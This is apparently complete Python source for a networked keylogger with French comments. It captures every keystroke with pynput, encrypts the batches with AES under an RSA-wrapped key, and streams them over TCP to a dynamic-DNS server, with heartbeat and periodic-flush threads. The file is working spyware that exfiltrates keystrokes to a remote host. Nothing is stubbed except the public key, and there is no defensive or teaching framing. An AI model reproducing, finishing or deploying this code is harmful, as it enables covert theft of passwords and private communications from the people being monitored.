import socket
import base64
import os
import time
import threading
import sys
from pynput import keyboard
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# === CONFIGURATION ===
SERVER_IP = "MonDDNS.ddns.net"
PORT = 5005
BATCH_SIZE = 20
SEND_INTERVAL = 15
HEARTBEAT_INTERVAL = 60
EXIT_ON_ERROR = True

# === CLÉ PUBLIQUE RSA
PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
**Public---KEY---ICI**
-----END PUBLIC KEY-----"""

# === INIT
aes_key = os.urandom(32)
buffer = []
buffer_lock = threading.Lock()
last_sent = time.time()
shift_pressed = False

public_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM)

def encrypt_aes_key(key_bytes, pub_key):
    return base64.b64encode(
        pub_key.encrypt(
            key_bytes,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    )

def encrypt_aes(data, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    padded = padder.update(data.encode(errors='ignore')) + padder.finalize()
    return base64.b64encode(iv + cipher.update(padded) + cipher.finalize())

def send_with_len(sock, payload):
    try:
        sock.sendall(len(payload).to_bytes(4, 'big') + payload)
    except (BrokenPipeError, ConnectionResetError):
        print("[CLIENT] 🚫 Déconnecté du serveur.")
        sock.close()
        sys.exit(1)

def flush_buffer():
    global last_sent
    try:
        with buffer_lock:
            if not buffer:
                return
            joined = ''.join(buffer)
            buffer.clear()
        encrypted = encrypt_aes(joined, aes_key)
        send_with_len(sock, encrypted)
        print(f"[CLIENT] 📤 Frappe envoyée : {joined}")
        last_sent = time.time()
    except Exception as e:
        print(f"[CLIENT] ❌ flush_buffer error : {e}")
        if EXIT_ON_ERROR:
            sock.close()
            sys.exit(1)

def heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL)
        with buffer_lock:
            if not buffer:
                try:
                    encrypted = encrypt_aes("PING", aes_key)
                    send_with_len(sock, encrypted)
                    print("[CLIENT] 💓 Heartbeat PING envoyé")
                except Exception as e:
                    print(f"[CLIENT] ❌ Heartbeat KO : {e}")
                    sys.exit(1)

def periodic_flush():
    while True:
        time.sleep(2)
        if time.time() - last_sent >= SEND_INTERVAL:
            flush_buffer()

def on_press(key):
    global shift_pressed
    flush_now = False
    try:
        with buffer_lock:
            if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                shift_pressed = True
                return
            elif key == keyboard.Key.space:
                buffer.append(" ")
            elif hasattr(key, 'char') and key.char:
                buffer.append(key.char.upper() if shift_pressed else key.char)
            elif key == keyboard.Key.enter:
                buffer.append("[Key.enter]")
                flush_now = True
            elif key == keyboard.Key.tab:
                buffer.append("[Key.tab]")
            elif key == keyboard.Key.backspace:
                buffer.append("[Key.backspace]")
            elif hasattr(key, 'vk'):
                if 96 <= key.vk <= 105:
                    buffer.append(str(key.vk - 96))
                elif key.vk == 110:
                    buffer.append('.')
                else:
                    buffer.append(f"<{key.vk}>")
            else:
                buffer.append(f"[{key}]")
            if len(buffer) >= BATCH_SIZE:
                flush_now = True
        if flush_now:
            flush_buffer()
    except Exception as e:
        print(f"[CLIENT] ❌ Keylogger error : {e}")

def on_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_r):
        shift_pressed = False

# === CONNEXION
try:
    sock = socket.socket()
    sock.connect((SERVER_IP, PORT))
    print("[CLIENT] 🔐 Connexion établie avec le serveur.")
    enc_key = encrypt_aes_key(aes_key, public_key)
    send_with_len(sock, enc_key)
    print("[CLIENT] 🔑 Clé AES envoyée.")
except Exception as e:
    print(f"[CLIENT] ❌ Échec connexion : {e}")
    sys.exit(1)

# === LANCEMENT THREADS
threading.Thread(target=heartbeat, daemon=True).start()
threading.Thread(target=periodic_flush, daemon=True).start()

# === LANCEMENT KEYLOGGER
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("[CLIENT] 🎯 Keylogger actif (Ctrl+C pour arrêter)")
        listener.join()
except KeyboardInterrupt:
    print("[CLIENT] 🛑 Fermeture manuelle")
finally:
    sock.close()
    sys.exit(0)
